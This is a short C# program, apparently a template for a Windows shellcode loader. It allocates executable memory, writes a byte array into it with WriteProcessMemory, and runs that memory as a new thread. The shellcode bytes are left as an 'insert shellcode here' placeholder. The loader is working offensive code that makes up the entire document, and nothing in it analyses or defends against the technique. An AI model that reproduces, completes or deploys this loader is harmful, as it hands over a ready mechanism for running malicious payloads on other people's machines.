```csharp
using System;
using System.Runtime.InteropServices;

namespace ShellcodePayload
{
    class Payload
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

        [DllImport("kernel32.dll")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentProcess();

        static void Main()
        {
            // (1) insert our shellcode
            byte[] shellCode = new byte[] { /* insert shellcode here */ };

            // Print the shellcode to the screen
            Console.WriteLine("Shellcode: " + BitConverter.ToString(shellCode));

            // (2) allocate memory for shellcode
            UInt32 MEM_COMMIT = 0x1000;
            UInt32 PAGE_EXECUTE_READWRITE = 0x40;
            IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (UInt32)shellCode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

            // (3) inject shellcode into allocated memory using WriteProcessMemory
            IntPtr bytesWritten;
            bool result = WriteProcessMemory(GetCurrentProcess(), funcAddr, shellCode, (uint)shellCode.Length, out bytesWritten);

            if (!result)
            {
                Console.WriteLine("Failed to write shellcode to memory.");
                return;
            }

            Console.WriteLine($"Successfully wrote {bytesWritten} bytes to memory.");

            // (4) execute injected shellcode
            UInt32 threadId = 0;
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, funcAddr, IntPtr.Zero, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```